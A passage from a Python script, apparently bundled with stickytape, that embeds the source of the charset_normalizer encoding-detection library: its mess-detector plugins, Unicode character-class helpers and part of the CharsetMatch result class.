# type: Dict[str, str]\n\n\nCOMMON_SAFE_ASCII_CHARACTERS = {\n    "<",\n    ">",\n    "=",\n    ":",\n    "/",\n    "&",\n    ";",\n    "{",\n    "}",\n    "[",\n    "]",\n    ",",\n    "|",\n    \'"\',\n    "-",\n}  # type: Set[str]\n\n\nKO_NAMES = {"johab", "cp949", "euc_kr"}  # type: Set[str]\nZH_NAMES = {"big5", "cp950", "big5hkscs", "hz"}  # type: Set[str]\n\nNOT_PRINTABLE_PATTERN = re_compile(r"[0-9\\W\\n\\r\\t]+")\n\nLANGUAGE_SUPPORTED_COUNT = len(FREQUENCIES)  # type: int\n\n# Logging LEVEL bellow DEBUG\nTRACE = 5  # type: int\n')
    __stickytape_write_module('charset_normalizer/md.py', b'from functools import lru_cache\nfrom typing import List, Optional\n\nfrom .constant import COMMON_SAFE_ASCII_CHARACTERS, UNICODE_SECONDARY_RANGE_KEYWORD\nfrom .utils import (\n    is_accentuated,\n    is_ascii,\n    is_case_variable,\n    is_cjk,\n    is_emoticon,\n    is_hangul,\n    is_hiragana,\n    is_katakana,\n    is_latin,\n    is_punctuation,\n    is_separator,\n    is_symbol,\n    is_thai,\n    remove_accent,\n    unicode_range,\n)\n\n\nclass MessDetectorPlugin:\n    """\n    Base abstract class used for mess detection plugins.\n    All detectors MUST extend and implement given methods.\n    """\n\n    def eligible(self, character: str) -> bool:\n        """\n        Determine if given character should be fed in.\n        """\n        raise NotImplementedError  # pragma: nocover\n\n    def feed(self, character: str) -> None:\n        """\n        The main routine to be executed upon character.\n        Insert the logic in witch the text would be considered chaotic.\n        """\n        raise NotImplementedError  # pragma: nocover\n\n    def reset(self) -> None:  # pragma: no cover\n        """\n        Permit to reset the plugin to the initial state.\n        """\n        raise NotImplementedError\n\n    @property\n    def ratio(self) -> float:\n        """\n        Compute the chaos ratio based on what your feed() has seen.\n        Must NOT be lower than 0.; No restriction gt 0.\n        """\n        raise NotImplementedError  # pragma: nocover\n\n\nclass TooManySymbolOrPunctuationPlugin(MessDetectorPlugin):\n    def __init__(self) -> None:\n        self._punctuation_count = 0  # type: int\n        self._symbol_count = 0  # type: int\n        self._character_count = 0  # type: int\n\n        self._last_printable_char = None  # type: Optional[str]\n        self._frenzy_symbol_in_word = False  # type: bool\n\n    def eligible(self, character: str) -> bool:\n        return character.isprintable()\n\n    def feed(self, character: str) -> None:\n        self._character_count += 1\n\n        if (\n            character != self._last_printable_char\n            and character not in COMMON_SAFE_ASCII_CHARACTERS\n        ):\n            if is_punctuation(character):\n                self._punctuation_count += 1\n            elif (\n                character.isdigit() is False\n                and is_symbol(character)\n                and is_emoticon(character) is False\n            ):\n                self._symbol_count += 2\n\n        self._last_printable_char = character\n\n    def reset(self) -> None:  # pragma: no cover\n        self._punctuation_count = 0\n        self._character_count = 0\n        self._symbol_count = 0\n\n    @property\n    def ratio(self) -> float:\n        if self._character_count == 0:\n            return 0.0\n\n        ratio_of_punctuation = (\n            self._punctuation_count + self._symbol_count\n        ) / self._character_count  # type: float\n\n        return ratio_of_punctuation if ratio_of_punctuation >= 0.3 else 0.0\n\n\nclass TooManyAccentuatedPlugin(MessDetectorPlugin):\n    def __init__(self) -> None:\n        self._character_count = 0  # type: int\n        self._accentuated_count = 0  # type: int\n\n    def eligible(self, character: str) -> bool:\n        return character.isalpha()\n\n    def feed(self, character: str) -> None:\n        self._character_count += 1\n\n        if is_accentuated(character):\n            self._accentuated_count += 1\n\n    def reset(self) -> None:  # pragma: no cover\n        self._character_count = 0\n        self._accentuated_count = 0\n\n    @property\n    def ratio(self) -> float:\n        if self._character_count == 0:\n            return 0.0\n        ratio_of_accentuation = (\n            self._accentuated_count / self._character_count\n        )  # type: float\n        return ratio_of_accentuation if ratio_of_accentuation >= 0.35 else 0.0\n\n\nclass UnprintablePlugin(MessDetectorPlugin):\n    def __init__(self) -> None:\n        self._unprintable_count = 0  # type: int\n        self._character_count = 0  # type: int\n\n    def eligible(self, character: str) -> bool:\n        return True\n\n    def feed(self, character: str) -> None:\n        if (\n            character.isspace() is False  # includes \\n \\t \\r \\v\n            and character.isprintable() is False\n            and character != "\\x1A"  # Why? Its the ASCII substitute character.\n        ):\n            self._unprintable_count += 1\n        self._character_count += 1\n\n    def reset(self) -> None:  # pragma: no cover\n        self._unprintable_count = 0\n\n    @property\n    def ratio(self) -> float:\n        if self._character_count == 0:\n            return 0.0\n\n        return (self._unprintable_count * 8) / self._character_count\n\n\nclass SuspiciousDuplicateAccentPlugin(MessDetectorPlugin):\n    def __init__(self) -> None:\n        self._successive_count = 0  # type: int\n        self._character_count = 0  # type: int\n\n        self._last_latin_character = None  # type: Optional[str]\n\n    def eligible(self, character: str) -> bool:\n        return character.isalpha() and is_latin(character)\n\n    def feed(self, character: str) -> None:\n        self._character_count += 1\n        if (\n            self._last_latin_character is not None\n            and is_accentuated(character)\n            and is_accentuated(self._last_latin_character)\n        ):\n            if character.isupper() and self._last_latin_character.isupper():\n                self._successive_count += 1\n            # Worse if its the same char duplicated with different accent.\n            if remove_accent(character) == remove_accent(self._last_latin_character):\n                self._successive_count += 1\n        self._last_latin_character = character\n\n    def reset(self) -> None:  # pragma: no cover\n        self._successive_count = 0\n        self._character_count = 0\n        self._last_latin_character = None\n\n    @property\n    def ratio(self) -> float:\n        if self._character_count == 0:\n            return 0.0\n\n        return (self._successive_count * 2) / self._character_count\n\n\nclass SuspiciousRange(MessDetectorPlugin):\n    def __init__(self) -> None:\n        self._suspicious_successive_range_count = 0  # type: int\n        self._character_count = 0  # type: int\n        self._last_printable_seen = None  # type: Optional[str]\n\n    def eligible(self, character: str) -> bool:\n        return character.isprintable()\n\n    def feed(self, character: str) -> None:\n        self._character_count += 1\n\n        if (\n            character.isspace()\n            or is_punctuation(character)\n            or character in COMMON_SAFE_ASCII_CHARACTERS\n        ):\n            self._last_printable_seen = None\n            return\n\n        if self._last_printable_seen is None:\n            self._last_printable_seen = character\n            return\n\n        unicode_range_a = unicode_range(\n            self._last_printable_seen\n        )  # type: Optional[str]\n        unicode_range_b = unicode_range(character)  # type: Optional[str]\n\n        if is_suspiciously_successive_range(unicode_range_a, unicode_range_b):\n            self._suspicious_successive_range_count += 1\n\n        self._last_printable_seen = character\n\n    def reset(self) -> None:  # pragma: no cover\n        self._character_count = 0\n        self._suspicious_successive_range_count = 0\n        self._last_printable_seen = None\n\n    @property\n    def ratio(self) -> float:\n        if self._character_count == 0:\n            return 0.0\n\n        ratio_of_suspicious_range_usage = (\n            self._suspicious_successive_range_count * 2\n        ) / self._character_count  # type: float\n\n        if ratio_of_suspicious_range_usage < 0.1:\n            return 0.0\n\n        return ratio_of_suspicious_range_usage\n\n\nclass SuperWeirdWordPlugin(MessDetectorPlugin):\n    def __init__(self) -> None:\n        self._word_count = 0  # type: int\n        self._bad_word_count = 0  # type: int\n        self._foreign_long_count = 0  # type: int\n\n        self._is_current_word_bad = False  # type: bool\n        self._foreign_long_watch = False  # type: bool\n\n        self._character_count = 0  # type: int\n        self._bad_character_count = 0  # type: int\n\n        self._buffer = ""  # type: str\n        self._buffer_accent_count = 0  # type: int\n\n    def eligible(self, character: str) -> bool:\n        return True\n\n    def feed(self, character: str) -> None:\n        if character.isalpha():\n            self._buffer = "".join([self._buffer, character])\n            if is_accentuated(character):\n                self._buffer_accent_count += 1\n            if (\n                self._foreign_long_watch is False\n                and (is_latin(character) is False or is_accentuated(character))\n                and is_cjk(character) is False\n                and is_hangul(character) is False\n                and is_katakana(character) is False\n                and is_hiragana(character) is False\n                and is_thai(character) is False\n            ):\n                self._foreign_long_watch = True\n            return\n        if not self._buffer:\n            return\n        if (\n            character.isspace() or is_punctuation(character) or is_separator(character)\n        ) and self._buffer:\n            self._word_count += 1\n            buffer_length = len(self._buffer)  # type: int\n\n            self._character_count += buffer_length\n\n            if buffer_length >= 4:\n                if self._buffer_accent_count / buffer_length > 0.34:\n                    self._is_current_word_bad = True\n                # Word/Buffer ending with a upper case accentuated letter are so rare,\n                # that we will consider them all as suspicious. Same weight as foreign_long suspicious.\n                if is_accentuated(self._buffer[-1]) and self._buffer[-1].isupper():\n                    self._foreign_long_count += 1\n                    self._is_current_word_bad = True\n            if buffer_length >= 24 and self._foreign_long_watch:\n                self._foreign_long_count += 1\n                self._is_current_word_bad = True\n\n            if self._is_current_word_bad:\n                self._bad_word_count += 1\n                self._bad_character_count += len(self._buffer)\n                self._is_current_word_bad = False\n\n            self._foreign_long_watch = False\n            self._buffer = ""\n            self._buffer_accent_count = 0\n        elif (\n            character not in {"<", ">", "-", "=", "~", "|", "_"}\n            and character.isdigit() is False\n            and is_symbol(character)\n        ):\n            self._is_current_word_bad = True\n            self._buffer += character\n\n    def reset(self) -> None:  # pragma: no cover\n        self._buffer = ""\n        self._is_current_word_bad = False\n        self._foreign_long_watch = False\n        self._bad_word_count = 0\n        self._word_count = 0\n        self._character_count = 0\n        self._bad_character_count = 0\n        self._foreign_long_count = 0\n\n    @property\n    def ratio(self) -> float:\n        if self._word_count <= 10 and self._foreign_long_count == 0:\n            return 0.0\n\n        return self._bad_character_count / self._character_count\n\n\nclass CjkInvalidStopPlugin(MessDetectorPlugin):\n    """\n    GB(Chinese) based encoding often render the stop incorrectly when the content does not fit and\n    can be easily detected. Searching for the overuse of \'\xe4\xb8\x85\' and \'\xe4\xb8\x84\'.\n    """\n\n    def __init__(self) -> None:\n        self._wrong_stop_count = 0  # type: int\n        self._cjk_character_count = 0  # type: int\n\n    def eligible(self, character: str) -> bool:\n        return True\n\n    def feed(self, character: str) -> None:\n        if character in {"\xe4\xb8\x85", "\xe4\xb8\x84"}:\n            self._wrong_stop_count += 1\n            return\n        if is_cjk(character):\n            self._cjk_character_count += 1\n\n    def reset(self) -> None:  # pragma: no cover\n        self._wrong_stop_count = 0\n        self._cjk_character_count = 0\n\n    @property\n    def ratio(self) -> float:\n        if self._cjk_character_count < 16:\n            return 0.0\n        return self._wrong_stop_count / self._cjk_character_count\n\n\nclass ArchaicUpperLowerPlugin(MessDetectorPlugin):\n    def __init__(self) -> None:\n        self._buf = False  # type: bool\n\n        self._character_count_since_last_sep = 0  # type: int\n\n        self._successive_upper_lower_count = 0  # type: int\n        self._successive_upper_lower_count_final = 0  # type: int\n\n        self._character_count = 0  # type: int\n\n        self._last_alpha_seen = None  # type: Optional[str]\n        self._current_ascii_only = True  # type: bool\n\n    def eligible(self, character: str) -> bool:\n        return True\n\n    def feed(self, character: str) -> None:\n        is_concerned = character.isalpha() and is_case_variable(character)\n        chunk_sep = is_concerned is False\n\n        if chunk_sep and self._character_count_since_last_sep > 0:\n            if (\n                self._character_count_since_last_sep <= 64\n                and character.isdigit() is False\n                and self._current_ascii_only is False\n            ):\n                self._successive_upper_lower_count_final += (\n                    self._successive_upper_lower_count\n                )\n\n            self._successive_upper_lower_count = 0\n            self._character_count_since_last_sep = 0\n            self._last_alpha_seen = None\n            self._buf = False\n            self._character_count += 1\n            self._current_ascii_only = True\n\n            return\n\n        if self._current_ascii_only is True and is_ascii(character) is False:\n            self._current_ascii_only = False\n\n        if self._last_alpha_seen is not None:\n            if (character.isupper() and self._last_alpha_seen.islower()) or (\n                character.islower() and self._last_alpha_seen.isupper()\n            ):\n                if self._buf is True:\n                    self._successive_upper_lower_count += 2\n                    self._buf = False\n                else:\n                    self._buf = True\n            else:\n                self._buf = False\n\n        self._character_count += 1\n        self._character_count_since_last_sep += 1\n        self._last_alpha_seen = character\n\n    def reset(self) -> None:  # pragma: no cover\n        self._character_count = 0\n        self._character_count_since_last_sep = 0\n        self._successive_upper_lower_count = 0\n        self._successive_upper_lower_count_final = 0\n        self._last_alpha_seen = None\n        self._buf = False\n        self._current_ascii_only = True\n\n    @property\n    def ratio(self) -> float:\n        if self._character_count == 0:\n            return 0.0\n\n        return self._successive_upper_lower_count_final / self._character_count\n\n\ndef is_suspiciously_successive_range(\n    unicode_range_a: Optional[str], unicode_range_b: Optional[str]\n) -> bool:\n    """\n    Determine if two Unicode range seen next to each other can be considered as suspicious.\n    """\n    if unicode_range_a is None or unicode_range_b is None:\n        return True\n\n    if unicode_range_a == unicode_range_b:\n        return False\n\n    if "Latin" in unicode_range_a and "Latin" in unicode_range_b:\n        return False\n\n    if "Emoticons" in unicode_range_a or "Emoticons" in unicode_range_b:\n        return False\n\n    # Latin characters can be accompanied with a combining diacritical mark\n    # eg. Vietnamese.\n    if ("Latin" in unicode_range_a or "Latin" in unicode_range_b) and (\n        "Combining" in unicode_range_a or "Combining" in unicode_range_b\n    ):\n        return False\n\n    keywords_range_a, keywords_range_b = unicode_range_a.split(\n        " "\n    ), unicode_range_b.split(" ")\n\n    for el in keywords_range_a:\n        if el in UNICODE_SECONDARY_RANGE_KEYWORD:\n            continue\n        if el in keywords_range_b:\n            return False\n\n    # Japanese Exception\n    range_a_jp_chars, range_b_jp_chars = (\n        unicode_range_a\n        in (\n            "Hiragana",\n            "Katakana",\n        ),\n        unicode_range_b in ("Hiragana", "Katakana"),\n    )\n    if (range_a_jp_chars or range_b_jp_chars) and (\n        "CJK" in unicode_range_a or "CJK" in unicode_range_b\n    ):\n        return False\n    if range_a_jp_chars and range_b_jp_chars:\n        return False\n\n    if "Hangul" in unicode_range_a or "Hangul" in unicode_range_b:\n        if "CJK" in unicode_range_a or "CJK" in unicode_range_b:\n            return False\n        if unicode_range_a == "Basic Latin" or unicode_range_b == "Basic Latin":\n            return False\n\n    # Chinese/Japanese use dedicated range for punctuation and/or separators.\n    if ("CJK" in unicode_range_a or "CJK" in unicode_range_b) or (\n        unicode_range_a in ["Katakana", "Hiragana"]\n        and unicode_range_b in ["Katakana", "Hiragana"]\n    ):\n        if "Punctuation" in unicode_range_a or "Punctuation" in unicode_range_b:\n            return False\n        if "Forms" in unicode_range_a or "Forms" in unicode_range_b:\n            return False\n\n    return True\n\n\n@lru_cache(maxsize=2048)\ndef mess_ratio(\n    decoded_sequence: str, maximum_threshold: float = 0.2, debug: bool = False\n) -> float:\n    """\n    Compute a mess ratio given a decoded bytes sequence. The maximum threshold does stop the computation earlier.\n    """\n\n    detectors = [\n        md_class() for md_class in MessDetectorPlugin.__subclasses__()\n    ]  # type: List[MessDetectorPlugin]\n\n    length = len(decoded_sequence) + 1  # type: int\n\n    mean_mess_ratio = 0.0  # type: float\n\n    if length < 512:\n        intermediary_mean_mess_ratio_calc = 32  # type: int\n    elif length <= 1024:\n        intermediary_mean_mess_ratio_calc = 64\n    else:\n        intermediary_mean_mess_ratio_calc = 128\n\n    for character, index in zip(decoded_sequence + "\\n", range(length)):\n        for detector in detectors:\n            if detector.eligible(character):\n                detector.feed(character)\n\n        if (\n            index > 0 and index % intermediary_mean_mess_ratio_calc == 0\n        ) or index == length - 1:\n            mean_mess_ratio = sum(dt.ratio for dt in detectors)\n\n            if mean_mess_ratio >= maximum_threshold:\n                break\n\n    if debug:\n        for dt in detectors:  # pragma: nocover\n            print(dt.__class__, dt.ratio)\n\n    return round(mean_mess_ratio, 3)\n')
    __stickytape_write_module('charset_normalizer/utils.py', b'try:\n    import unicodedata2 as unicodedata\nexcept ImportError:\n    import unicodedata  # type: ignore[no-redef]\n\nimport importlib\nimport logging\nfrom codecs import IncrementalDecoder\nfrom encodings.aliases import aliases\nfrom functools import lru_cache\nfrom re import findall\nfrom typing import List, Optional, Set, Tuple, Union\n\nfrom _multibytecodec import MultibyteIncrementalDecoder  # type: ignore\n\nfrom .constant import (\n    ENCODING_MARKS,\n    IANA_SUPPORTED_SIMILAR,\n    RE_POSSIBLE_ENCODING_INDICATION,\n    UNICODE_RANGES_COMBINED,\n    UNICODE_SECONDARY_RANGE_KEYWORD,\n    UTF8_MAXIMAL_ALLOCATION,\n)\n\n\n@lru_cache(maxsize=UTF8_MAXIMAL_ALLOCATION)\ndef is_accentuated(character: str) -> bool:\n    try:\n        description = unicodedata.name(character)  # type: str\n    except ValueError:\n        return False\n    return (\n        "WITH GRAVE" in description\n        or "WITH ACUTE" in description\n        or "WITH CEDILLA" in description\n        or "WITH DIAERESIS" in description\n        or "WITH CIRCUMFLEX" in description\n        or "WITH TILDE" in description\n    )\n\n\n@lru_cache(maxsize=UTF8_MAXIMAL_ALLOCATION)\ndef remove_accent(character: str) -> str:\n    decomposed = unicodedata.decomposition(character)  # type: str\n    if not decomposed:\n        return character\n\n    codes = decomposed.split(" ")  # type: List[str]\n\n    return chr(int(codes[0], 16))\n\n\n@lru_cache(maxsize=UTF8_MAXIMAL_ALLOCATION)\ndef unicode_range(character: str) -> Optional[str]:\n    """\n    Retrieve the Unicode range official name from a single character.\n    """\n    character_ord = ord(character)  # type: int\n\n    for range_name, ord_range in UNICODE_RANGES_COMBINED.items():\n        if character_ord in ord_range:\n            return range_name\n\n    return None\n\n\n@lru_cache(maxsize=UTF8_MAXIMAL_ALLOCATION)\ndef is_latin(character: str) -> bool:\n    try:\n        description = unicodedata.name(character)  # type: str\n    except ValueError:\n        return False\n    return "LATIN" in description\n\n\ndef is_ascii(character: str) -> bool:\n    try:\n        character.encode("ascii")\n    except UnicodeEncodeError:\n        return False\n    return True\n\n\n@lru_cache(maxsize=UTF8_MAXIMAL_ALLOCATION)\ndef is_punctuation(character: str) -> bool:\n    character_category = unicodedata.category(character)  # type: str\n\n    if "P" in character_category:\n        return True\n\n    character_range = unicode_range(character)  # type: Optional[str]\n\n    if character_range is None:\n        return False\n\n    return "Punctuation" in character_range\n\n\n@lru_cache(maxsize=UTF8_MAXIMAL_ALLOCATION)\ndef is_symbol(character: str) -> bool:\n    character_category = unicodedata.category(character)  # type: str\n\n    if "S" in character_category or "N" in character_category:\n        return True\n\n    character_range = unicode_range(character)  # type: Optional[str]\n\n    if character_range is None:\n        return False\n\n    return "Forms" in character_range\n\n\n@lru_cache(maxsize=UTF8_MAXIMAL_ALLOCATION)\ndef is_emoticon(character: str) -> bool:\n    character_range = unicode_range(character)  # type: Optional[str]\n\n    if character_range is None:\n        return False\n\n    return "Emoticons" in character_range\n\n\n@lru_cache(maxsize=UTF8_MAXIMAL_ALLOCATION)\ndef is_separator(character: str) -> bool:\n    if character.isspace() or character in {"\xef\xbd\x9c", "+", ",", ";", "<", ">"}:\n        return True\n\n    character_category = unicodedata.category(character)  # type: str\n\n    return "Z" in character_category\n\n\n@lru_cache(maxsize=UTF8_MAXIMAL_ALLOCATION)\ndef is_case_variable(character: str) -> bool:\n    return character.islower() != character.isupper()\n\n\ndef is_private_use_only(character: str) -> bool:\n    character_category = unicodedata.category(character)  # type: str\n\n    return character_category == "Co"\n\n\n@lru_cache(maxsize=UTF8_MAXIMAL_ALLOCATION)\ndef is_cjk(character: str) -> bool:\n    try:\n        character_name = unicodedata.name(character)\n    except ValueError:\n        return False\n\n    return "CJK" in character_name\n\n\n@lru_cache(maxsize=UTF8_MAXIMAL_ALLOCATION)\ndef is_hiragana(character: str) -> bool:\n    try:\n        character_name = unicodedata.name(character)\n    except ValueError:\n        return False\n\n    return "HIRAGANA" in character_name\n\n\n@lru_cache(maxsize=UTF8_MAXIMAL_ALLOCATION)\ndef is_katakana(character: str) -> bool:\n    try:\n        character_name = unicodedata.name(character)\n    except ValueError:\n        return False\n\n    return "KATAKANA" in character_name\n\n\n@lru_cache(maxsize=UTF8_MAXIMAL_ALLOCATION)\ndef is_hangul(character: str) -> bool:\n    try:\n        character_name = unicodedata.name(character)\n    except ValueError:\n        return False\n\n    return "HANGUL" in character_name\n\n\n@lru_cache(maxsize=UTF8_MAXIMAL_ALLOCATION)\ndef is_thai(character: str) -> bool:\n    try:\n        character_name = unicodedata.name(character)\n    except ValueError:\n        return False\n\n    return "THAI" in character_name\n\n\n@lru_cache(maxsize=len(UNICODE_RANGES_COMBINED))\ndef is_unicode_range_secondary(range_name: str) -> bool:\n    return any(keyword in range_name for keyword in UNICODE_SECONDARY_RANGE_KEYWORD)\n\n\ndef any_specified_encoding(sequence: bytes, search_zone: int = 4096) -> Optional[str]:\n    """\n    Extract using ASCII-only decoder any specified encoding in the first n-bytes.\n    """\n    if not isinstance(sequence, bytes):\n        raise TypeError\n\n    seq_len = len(sequence)  # type: int\n\n    results = findall(\n        RE_POSSIBLE_ENCODING_INDICATION,\n        sequence[: min(seq_len, search_zone)].decode("ascii", errors="ignore"),\n    )  # type: List[str]\n\n    if len(results) == 0:\n        return None\n\n    for specified_encoding in results:\n        specified_encoding = specified_encoding.lower().replace("-", "_")\n\n        for encoding_alias, encoding_iana in aliases.items():\n            if encoding_alias == specified_encoding:\n                return encoding_iana\n            if encoding_iana == specified_encoding:\n                return encoding_iana\n\n    return None\n\n\n@lru_cache(maxsize=128)\ndef is_multi_byte_encoding(name: str) -> bool:\n    """\n    Verify is a specific encoding is a multi byte one based on it IANA name\n    """\n    return name in {\n        "utf_8",\n        "utf_8_sig",\n        "utf_16",\n        "utf_16_be",\n        "utf_16_le",\n        "utf_32",\n        "utf_32_le",\n        "utf_32_be",\n        "utf_7",\n    } or issubclass(\n        importlib.import_module("encodings.{}".format(name)).IncrementalDecoder,  # type: ignore\n        MultibyteIncrementalDecoder,\n    )\n\n\ndef identify_sig_or_bom(sequence: bytes) -> Tuple[Optional[str], bytes]:\n    """\n    Identify and extract SIG/BOM in given sequence.\n    """\n\n    for iana_encoding in ENCODING_MARKS:\n        marks = ENCODING_MARKS[iana_encoding]  # type: Union[bytes, List[bytes]]\n\n        if isinstance(marks, bytes):\n            marks = [marks]\n\n        for mark in marks:\n            if sequence.startswith(mark):\n                return iana_encoding, mark\n\n    return None, b""\n\n\ndef should_strip_sig_or_bom(iana_encoding: str) -> bool:\n    return iana_encoding not in {"utf_16", "utf_32"}\n\n\ndef iana_name(cp_name: str, strict: bool = True) -> str:\n    cp_name = cp_name.lower().replace("-", "_")\n\n    for encoding_alias, encoding_iana in aliases.items():\n        if cp_name in [encoding_alias, encoding_iana]:\n            return encoding_iana\n\n    if strict:\n        raise ValueError("Unable to retrieve IANA for \'{}\'".format(cp_name))\n\n    return cp_name\n\n\ndef range_scan(decoded_sequence: str) -> List[str]:\n    ranges = set()  # type: Set[str]\n\n    for character in decoded_sequence:\n        character_range = unicode_range(character)  # type: Optional[str]\n\n        if character_range is None:\n            continue\n\n        ranges.add(character_range)\n\n    return list(ranges)\n\n\ndef cp_similarity(iana_name_a: str, iana_name_b: str) -> float:\n\n    if is_multi_byte_encoding(iana_name_a) or is_multi_byte_encoding(iana_name_b):\n        return 0.0\n\n    decoder_a = importlib.import_module("encodings.{}".format(iana_name_a)).IncrementalDecoder  # type: ignore\n    decoder_b = importlib.import_module("encodings.{}".format(iana_name_b)).IncrementalDecoder  # type: ignore\n\n    id_a = decoder_a(errors="ignore")  # type: IncrementalDecoder\n    id_b = decoder_b(errors="ignore")  # type: IncrementalDecoder\n\n    character_match_count = 0  # type: int\n\n    for i in range(255):\n        to_be_decoded = bytes([i])  # type: bytes\n        if id_a.decode(to_be_decoded) == id_b.decode(to_be_decoded):\n            character_match_count += 1\n\n    return character_match_count / 254\n\n\ndef is_cp_similar(iana_name_a: str, iana_name_b: str) -> bool:\n    """\n    Determine if two code page are at least 80% similar. IANA_SUPPORTED_SIMILAR dict was generated using\n    the function cp_similarity.\n    """\n    return (\n        iana_name_a in IANA_SUPPORTED_SIMILAR\n        and iana_name_b in IANA_SUPPORTED_SIMILAR[iana_name_a]\n    )\n\n\ndef set_logging_handler(\n    name: str = "charset_normalizer",\n    level: int = logging.INFO,\n    format_string: str = "%(asctime)s | %(levelname)s | %(message)s",\n) -> None:\n\n    logger = logging.getLogger(name)\n    logger.setLevel(level)\n\n    handler = logging.StreamHandler()\n    handler.setFormatter(logging.Formatter(format_string))\n    logger.addHandler(handler)\n')
    __stickytape_write_module('charset_normalizer/models.py', b'import warnings\nfrom collections import Counter\nfrom encodings.aliases import aliases\nfrom hashlib import sha256\nfrom json import dumps\nfrom re import sub\nfrom typing import Any, Dict, Iterator, List, Optional, Tuple, Union\n\nfrom .constant import NOT_PRINTABLE_PATTERN, TOO_BIG_SEQUENCE\nfrom .md import mess_ratio\nfrom .utils import iana_name, is_multi_byte_encoding, unicode_range\n\n\nclass CharsetMatch:\n    def __init__(\n        self,\n        payload: bytes,\n        guessed_encoding: str,\n        mean_mess_ratio: float,\n        has_sig_or_bom: bool,\n        languages: "CoherenceMatches",\n        decoded_payload: Optional[str] = None,\n    ):\n        self._payload = payload  # type: bytes\n\n        self._encoding = guessed_encoding  # type: str\n        self._mean_mess_ratio = mean_mess_ratio  # type: float\n        self._languages = languages  # type: CoherenceMatches\n        self._has_sig_or_bom = has_sig_or_bom  # type: bool\n        self._unicode_ranges = None  # type: Optional[List[str]]\n\n        self._leaves = []  # type: List[CharsetMatch]\n        self._mean_coherence_ratio = 0.0  # type: float\n\n        self._output_payload = None  # type: Optional[bytes]\n        self._output_encoding = None  # type: Optional[str]\n\n        self._string = decoded_payload  # type: Optional[str]\n\n    def __eq__(self, other: object) -> bool:\n        if not isinstance(other, CharsetMatch):\n            raise TypeError(\n                "__eq__ cannot be invoked on {} and {}.".format(\n                    str(other.__class__), str(self.__class__)\n                )\n            )\n        return self.encoding == other.encoding and self.fingerprint == other.fingerprint\n\n    def __lt__(self, other: object) -> bool:\n        """\n        Implemented to make sorted available upon CharsetMatches items.\n        """\n        if not isinstance(other, CharsetMatch):\n            raise ValueError\n\n        chaos_difference = abs(self.chaos - other.chaos)  # type: float\n        coherence_difference = abs(self.coherence - other.coherence)  # type: float\n\n        # Bellow 1% difference --> Use Coherence\n        if chaos_difference < 0.01 and coherence_difference > 0.02:\n            # When having a tough decision, use the result that decoded as many multi-byte as possible.\n            if chaos_difference == 0.0 and self.coherence == other.coherence:\n                return self.multi_byte_usage > other.multi_byte_usage\n            return self.coherence > other.coherence\n\n        return self.chaos < other.chaos\n\n    @property\n    def multi_byte_usage(self) -> float:\n        return 1.0 - len(str(self)) / len(self.raw)\n\n    @property\n    def chaos_secondary_pass(self) -> float:\n        """\n        Check once again chaos in decoded text, except this time, with full content.\n        Use with caution, this can be very slow.\n        Notice: Will be removed in 3.0\n        """\n        warnings.warn(\n            "chaos_secondary_pass is deprecated and will be removed in 3.0",\n            DeprecationWarning,\n        )\n        return mess_ratio(str(self), 1.0)\n\n    @property\n    def coherence_non_latin(self) -> float:\n        """\n        Coherence ratio on the first non-latin language detected if ANY.\n        Notice: Will be removed in 3.0\n        """\n        warnings.warn(\n            "coherence_non_latin is deprecated and will be removed in 3.0",\n            DeprecationWarning,\n        )\n        return 0.0\n\n    @property\n    def w_counter(self) -> Counter:\n        """\n        Word counter instance on decoded text.\n        Notice: Will be removed in 3.0\n        """\n        warnings.warn(\n            "w_counter is deprecated and will be removed in 3.0", DeprecationWarning\n        )\n\n        string_printable_only = sub(NOT_PRINTABLE_PATTERN, " ", str(self).lower())\n\n        return Counter(string_printable_only.split())\n\n    def __str__(self) -> str:\n        # Lazy Str Loading\n        if self._string is None:\n            self._string = str(self._payload, self._encoding, "strict")\n        return self._string\n\n    def __repr__(self) -> str:\n        return "<CharsetMatch \'{}\' bytes({})>".format(self.encoding, self.fingerprint)\n\n    def add_submatch(self, other: "CharsetMatch") -> None:\n        if not isinstance(other, CharsetMatch) or other == self:\n            raise ValueError(\n                "Unable to add instance <{}> as a submatch of a CharsetMatch".format(\n                    other.__class__\n                )\n            )\n\n        other._string = None  # Unload RAM usage; dirty trick.\n        self._leaves.append(other)\n\n    @property\n    def encoding(self) -> str:\n        return self._encoding\n\n    @property\n    def encoding_aliases(self) -> List[str]:\n        """\n        Encoding name are known by many name, using this could help when searching for IBM855 when it\'s listed as CP855.\n        """\n        also_known_as = []  # type: List[str]\n        for u, p in aliases.items():\n            if self.encoding == u:\n                also_known_as.append(p)\n            elif self.encoding == p:\n                also_known_as.append(u)\n        return also_known_as\n\n    @property\n    def bom(self) -> bool:\n        return self._has_sig_or_bom\n\n    @property\n    def byte_order_mark(self) -> bool:\n        return self._has_sig_or_bom\n\n    @property\n    def languages(self) -> List[str]:\n        """\n        Return the complete list of possible languages found in decoded sequence.\n        Usually not really useful. Returned list may be empty even if \'language\' property return something != \'Unknown\'.\n        """\n        return [e[0] for e in self._languages]\n\n    @property\n    def language(self) -> str:\n        """\n        Most probable language found in decoded sequence. If none were detected or inferred, the property will return\n        "Unknown".\n        """\n        if not self._languages:\n            # Trying to infer the language based on the given encoding\n            # Its either English or we should not pronounce ourselves in certain cases.\n            if "ascii" in self.could_be_from_charset:\n                return "English"\n\n            # doing it there to avoid circular import\n            from charset_normalizer.cd import encoding_languages, mb_encoding_languages\n\n            languages = (\n                mb_encoding_languages(self.encoding)\n                if is_multi_byte_encoding(self.encoding)\n                else encoding_languages(self.encoding)\n            )\n\n            if len(languages) == 0 or "Latin Based" in languages:\n                return "Unknown"\n\n            return languages[0]\n\n        return self._languages[0][0]\n\n    @property\n    def chaos(self) -> float:\n        return self._mean_mess_ratio\n\n    @property\n    def coherence(self) -> float:\n        if not self._languages:\n            return 0.0\n        return self._languages[0][1]\n\n    @property\n    def percent_chaos(self) -> float:\n        return round(self.chaos * 100, ndigits=3)\n\n    @property\n    def percent_coherence(self) -> float:\n        return round(self.coherence * 100, ndigits=3)\n\n    @property\n    def raw(self) -> bytes:\n        """\n        Original untouched bytes.\n        """\n        return self._payload\n\n    @property\n    def submatch(self) -> List["CharsetMatch"]:\n        return self._leaves\n\n    @property\n    def has_submatch(self) -> bool:\n        return len(self._leaves) > 0\n\n    @property\n    def alphabets(self) -> List[str]:\n        if self._unicode_ranges is not None:\n            return self._unicode_ranges\n        # list detected ranges\n        detected_ranges = [\n            unicode_range(char) for char in str(self)\n        ]  # type: List[Optional[str]]\n        # filter and sort\n        self._unicode_ranges = sorted(list({r for r in detected_ranges if r}))\n        return self._unicode_ranges\n\n    @property\n    def could_be_from_charset(self) -> 